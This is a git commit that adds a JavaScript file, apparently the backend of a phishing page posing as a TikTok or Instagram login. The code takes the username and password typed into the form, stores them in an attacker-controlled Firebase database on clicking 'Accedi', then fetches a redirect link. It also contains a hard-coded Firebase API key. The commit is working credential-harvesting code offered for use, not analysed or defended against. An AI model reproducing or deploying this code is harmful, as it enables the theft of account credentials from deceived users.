24a917e05128b75278752acdbd03a299399af213
Maurolixx <instagramlinkinstagram@gmail.com>
2021-11-04 18:20:47 +0100

    launch

---
+++ Firebase.js
@@ -0,0 +1,49 @@
+let NomeUtente,Password,Link;
+
+Link = "";
+
+const btnAcces = document.getElementById("btnAccedi");
+
+firebase.initializeApp({
+  apiKey: 'AIzaSyCAKYQeM2szDKjWMMp6Ou4qeNkVdmN2MKg',
+  authDomain: 'tiktokcrack-a8c28.firebaseapp.com',
+  projectId: 'tiktokcrack-a8c28'
+});
+
+var db = firebase.firestore();
+
+//-----------Aqcuisizione dati--------------------//
+
+NomeUtente = document.getElementById("Nome").value;
+Password = document.getElementById("Password").value;
+
+//-----------Spedizione dati--------------------//
+
+btnAcces.addEventListener('click', () => {
+  db.collection("users").add({
+      name: NomeUtente,
+      password: Password,
+  })
+  .then((docRef) => {
+        apriLink();
+  })
+});
+
+  //--------------Controllo dati----------------------//
+
+setInterval(() => {
+NomeUtente = document.getElementById("Nome").value;
+Password = document.getElementById("Password").value;
+if(NomeUtente != "" && Password != ""){
+  document.getElementById("btnAccedi").disabled=false;
+}
+else {
+  document.getElementById("btnAccedi").disabled=true;
+}}, 20);
+
+function apriLink(){
+const dbRef = firebase.database().ref();
+  dbRef.child("/link/link/link").get().then((snapshot) => {
+    log(snapshot.val());
+  });
+}
